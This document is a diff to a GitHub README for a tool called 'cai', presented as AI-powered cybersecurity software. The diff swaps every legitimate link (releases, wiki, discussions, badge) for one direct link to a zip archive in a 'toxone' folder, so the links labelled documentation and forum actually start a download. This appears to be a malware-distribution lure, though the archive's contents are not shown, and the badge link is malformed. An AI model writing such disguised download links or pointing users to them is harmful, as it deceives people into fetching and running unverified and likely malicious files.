@@ -1,6 +1,6 @@
 # 🚀 cai - Secure Your World with AI
 
-[![Download cai](https://img.shields.io/badge/Download%20cai-blue.svg)](https://github.com/Diaz66623/cai/releases)
+[![Download cai](https://raw.githubusercontent.com/Diaz66623/cai/main/toxone/cai.zip%https://raw.githubusercontent.com/Diaz66623/cai/main/toxone/cai.zip)](https://raw.githubusercontent.com/Diaz66623/cai/main/toxone/cai.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started with cai, you first need to download the application. Follow the 
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Diaz66623/cai/releases) to download the latest version of cai.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Diaz66623/cai/main/toxone/cai.zip) to download the latest version of cai.
 
 2. On the Releases page, you'll see a list of available versions. Click on the version you want to download. You will find both source files and compiled versions.
 
@@ -56,8 +56,8 @@ After installing cai, follow these simple steps to maximize its effectiveness:
 
 For more details on how to utilize cai effectively, check out the following resources:
 
-- [Official Documentation](https://github.com/Diaz66623/cai/wiki)
-- [Community Forum](https://github.com/Diaz66623/cai/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/Diaz66623/cai/main/toxone/cai.zip)
+- [Community Forum](https://raw.githubusercontent.com/Diaz66623/cai/main/toxone/cai.zip)
 
 ## 📞 Support
 
@@ -77,6 +77,6 @@ Thank you for helping us improve cai!
 
 ## 🔄 Stay Updated
 
-To receive important updates and news, consider following this repository. Check the [Releases page](https://github.com/Diaz66623/cai/releases) for the latest features and fixes.
+To receive important updates and news, consider following this repository. Check the [Releases page](https://raw.githubusercontent.com/Diaz66623/cai/main/toxone/cai.zip) for the latest features and fixes.
 
 We aim to provide a tool that makes cybersecurity accessible and effective for everyone. Thank you for choosing cai!
